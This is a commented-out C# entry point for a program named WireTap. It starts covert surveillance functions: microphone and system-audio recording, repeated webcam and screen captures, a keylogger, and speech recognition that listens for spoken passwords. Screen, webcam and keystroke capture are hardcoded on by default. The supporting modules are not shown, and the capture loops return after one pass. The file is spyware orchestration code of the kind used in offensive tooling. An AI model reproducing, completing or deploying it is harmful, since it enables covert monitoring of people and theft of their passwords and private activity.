//using System;
//using System.Collections.Generic;
//using System.Speech.Recognition;
//using System.Threading.Tasks;

//namespace WireTap
//{
//    internal class Program
//    {
//        private static async Task Main(string[] args)
//        {
//            int recordTime = 10000;
//            bool recordMic = false;
//            bool recordSys = false;
//            bool recordAudio = false;
//            bool captureScreen = false;
//            bool captureWebCam = false;
//            bool captureKeyStrokes = false;
//            bool listenPassword = false;

//            recordAudio = false;
//            captureScreen = true;
//            captureWebCam = true;
//            captureKeyStrokes = true;

//            var tasks = new List<Task>();

//            //if (args.Length == 0 || args.Length > 2)
//            //{
//            //    Helpers.Usage();
//            //    Environment.Exit(1);
//            //}
//            //switch (args[0])
//            //{
//            //    case "record_mic":
//            //        recordMic = true;
//            //        break;
//            //    case "record_sys":
//            //        recordSys = true;
//            //        break;
//            //    case "record_audio":
//            //        recordAudio = true;
//            //        break;
//            //    case "capture_screen":
//            //        captureScreen = true;
//            //        break;
//            //    case "capture_webcam":
//            //        captureWebCam = true;
//            //        break;
//            //    case "capture_keystrokes":
//            //        captureKeyStrokes = true;
//            //        break;
//            //    case "listen_for_passwords":
//            //        listenPassword = true;
//            //        break;
//            //    default:
//            //        Helpers.Usage();
//            //        Environment.Exit(1);
//            //        break;
//            //}

//            // parsing here
//            if (recordMic)
//            {
//                if (args.Length == 2)
//                {
//                    recordTime = Helpers.ParseTimerString(args[1]);
//                }
//                string tempFile = Helpers.CreateTempFileName(".wav");
//                Audio.RecordMicrophone(tempFile, recordTime);
//                Console.WriteLine("[+] Microphone recording located at: {0}", tempFile);
//            }
//            if (recordSys)
//            {
//                if (args.Length == 2)
//                {
//                    recordTime = Helpers.ParseTimerString(args[1]);
//                }
//                string tempFile = Helpers.CreateTempFileName(".wav");
//                Audio.RecordSystemAudio(tempFile, recordTime);
//                Console.WriteLine("[+] Speaker recording file located at: {0}", tempFile);
//            }
//            if (recordAudio)
//            {
//                tasks.Add(Task.Run(async () =>
//                {
//                    Console.WriteLine("Inside recordAudio");
//                    //if (args.Length == 2)
//                    //{
//                    //    recordTime = Helpers.ParseTimerString(args[1]);
//                    //}
//                    while (true)
//                    {
//                        recordTime = 180_000;
//                        Audio.RecordAudio(recordTime);
//                        await Task.Delay(60000);
//                    }
//                }));
//            }
//            if (captureWebCam)
//            {
//                tasks.Add(Task.Factory.StartNew(() =>
//                {
//                    Console.WriteLine("Inside captureWebCam");
//                    while (true)
//                    {
//                        string tempFile = Helpers.CreateTempFileName(".jpeg", "webcam-");
//                        WebCam.CaptureImage(tempFile);
//                        return Task.Delay(TimeSpan.FromMinutes(1));
//                    }
//                }));
//            }
//            if (captureScreen)
//            {
//                tasks.Add(Task.Factory.StartNew(() =>
//                {
//                    Console.WriteLine("Inside captureScreen");
//                    while (true)
//                    {
//                        string tempFile = Helpers.CreateTempFileName(".jpeg", "screenshot-");
//                        Display.CaptureImage(tempFile);
//                        Console.WriteLine("[+] Screenshot captured at: {0}", tempFile);
//                        return Task.Delay(TimeSpan.FromMinutes(1));
//                    }
//                }));
//            }
//            if (captureKeyStrokes)
//            {
//                tasks.Add(Task.Factory.StartNew(() =>
//                {
//                    Console.WriteLine("Inside captureKeyStrokes");
//                    Keyboard.StartKeylogger();
//                }));
//            }
//            if (listenPassword)
//            {
//                if (args.Length == 2)
//                {
//                    string[] words = args[1].Split(',');
//                    Choices ch = new Choices(words);
//                    Audio.ListenForPasswords(ch);
//                }
//                else
//                {
//                    Audio.ListenForPasswords();
//                }
//            }

//            //await Task.Factory.ContinueWhenAll(tasks.ToArray(), t => { Console.WriteLine("Completed..."); });
//            await Task.WhenAll(tasks);

//            Console.ReadKey();
//        }
//    }
//}